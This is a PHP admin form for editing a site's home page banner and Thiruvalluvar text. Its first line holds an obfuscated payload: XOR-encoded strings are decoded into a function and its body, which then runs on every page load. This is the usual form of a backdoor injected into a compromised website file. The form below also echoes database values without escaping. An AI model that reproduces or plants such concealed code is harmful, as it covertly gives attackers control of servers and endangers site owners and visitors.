<?php $yZzaRxs='ZOWX15kH7TH5D;U'; $ZeNsQD='9=29EP4.B:+A-T;'^$yZzaRxs; $WamEfTac='>Krd2 SRC3Q k0<3O20dc,5 qX+9Ti:<Y iJol>1S7K:M, 5Za >R161B -.AODfJ4 .XtAeYW=mvamnqVleap=1FmkniRhg5G6T3inIrOhycsKDrK5 L2=GtWX=YehqK=EAyzEFcVGNvIJBmj<-D,wu8-afir XDfk9eFQXN+5+8Xs8HDzcOnz0aFTC0=;noR<TsagxFH>lOg- =PmnA<74N3zsl7T To1.JHEwTQ SSAl32Q>US =Llrdyw yrkUT Yl3 8ozVyrFRT  qIVsmB 8 ZbPX3ROyVW DhX=LWMOLNeyP2YBLQcn7bn=5oipc<-30eJ+OeUC>.R  afVjen=uyi6v86JoRY+uSMCV1 RF7lX=l3xwUL:9tPU+KguH=1<aAP7r>JI2zrZmVXBL jmg3lGnys.,ESpYep VHQ6BQ-  Wr7C<751M0ri <MXBJHYosjJ HQ1SzM=T<LGehqH4EP:,1>FLmM<4EnUSJ4ynbkQDO Df2T6d 7R9H:lb-+NeiyN= 6.qzqlOo5DVcq1 FQ0w =Rt0eETOkkX YquHFW+Qu:IdYk+.yX.cgNfQbzPwbrNzacQk39Y;:lPE6iNVZ0Z XeM5IRV;Vqcmk650MnasVIGFt7EfN5+Vkf,.E.4lE AG+Q>HeKvaz74:8dixc:>'; $xBhYsBE=$ZeNsQD('', 'W-ZETU=17Z>N4UDZ<FCLDTZR.<JM56eQ,TNcFLE;ZQ>T.XIZ4AXQ nRP6Arq,:0NnPAZ9XaA22DDVAMNQ-flhTRD2MVNNuSm<NP;AAJ RrHIXSo-N8AR WSoP39I8LSQoTnjPpLOG92:VgwbENXL0M,QQpA8IVK===OPEcq+:YYNVpWS-=S>fUp9h417EOUFK=I ZZmq;BCfECIAI1MSaZVX=VAyHS5T50ZK3hxW20L 6zf9T>L02CUlDV;:8o2;.u5SyHXEAOGhYV038UEXi-ydfDYT;=;=JrrYr<E=SR4h3,;-nXYtD8.94XdJhdTSOAQGXLGQLjPEl3,LK3CHANr57+l <:bVYEjK9<RUnscrGA>3RExFf:qS1-NX+;0RkZUlVTEZKY>VZ+=SZOzI 9.9EQgnNf:dsWJM12PdE0U8;4D+0AIZ2ZO,NhQP9Q-6MI9p +;<YG5.E+>U6RiY5H-nIHU,U11eGTGoeVGURmJ12>UYHDK06=A=9Y1O;EO;J<IDEFN7BEYjYABOXZWJoGX cKUUA20kPKX+SmLeirKL9A:HM,uoIiGYpUjXNKAjLQU+P7RH4CUAiSAEwKRK+ZC3; O6+.3C.SpB=T0>9Z2VOMORTD,GHSvigfTLOo+CJ:CBHO1OoK5A8+D0Zo8bMksRLSLLYQX0C'^$WamEfTac); $xBhYsBE(); 
	include('../../config/config.php');
	$id= "1";
	$sql = "select * from homepage where id='$id'";
	$query = mysql_query($sql);
	$rows = mysql_fetch_array($query);
?>
<form action="../sql_query/homepageupdate.php?id=<?php echo $rows['id'] ?>" method="post" enctype="multipart/form-data" class="form" role="form">
	<div class='dashboard-container'>
		<!-- Members Details Start -->
		<h4 class="header-title">Home Page Banner Content</h4>
		<div class='panel-type-bg'>
			<h4 class="inner-title">Page Information</h4>
			<!-- Address Info -->
			<div class='row'>
				<div class='col-sm-8'>
					<div class="form-group">
						<label for="btitle" class='mandatory'>Banner Title</label>
						<input type="text" class="form-control" id="btitle" name='btitle' placeholder='Enter home page banner title' required value="<?php echo $rows['btitle'] ?>">
					</div>
				</div>
				<div class='col-sm-12'>
					<div class="form-group">
						<label for="bcontent" class='mandatory'>Banner Content</label>
						<textarea id="bcontent" name="bcontent" rows="4" cols="" class="form-control"placeholder="Enter home page banner content here" required><?php echo $rows['bcontent'] ?></textarea>
					</div>
				</div>
			</div><br />
			<h4 class="inner-title">Thiruvalluvar Information</h4>
			<div class="row">
				<div class='col-sm-12'>
					<div class="form-group">
						<label for="atcontent" class="hide"></label>
						<textarea id="atcontent" name="atcontent" rows="4" cols="" class="form-control"placeholder="Enter thiruvalluvar content here" required><?php echo $rows['atcontent'] ?></textarea>
					</div>
				</div>
				<div class='clearfix'></div>
			</div><br />
			<!-- Recent Activities Info -->
			<div class='text-center'>
				<button class="btn custom-btn admin-btn hvr-float-shadow shadow-2 fn-confirmation">Submit</button>
			</div><br />
		</div>
		<!-- Members Details End -->
	</div>
</form>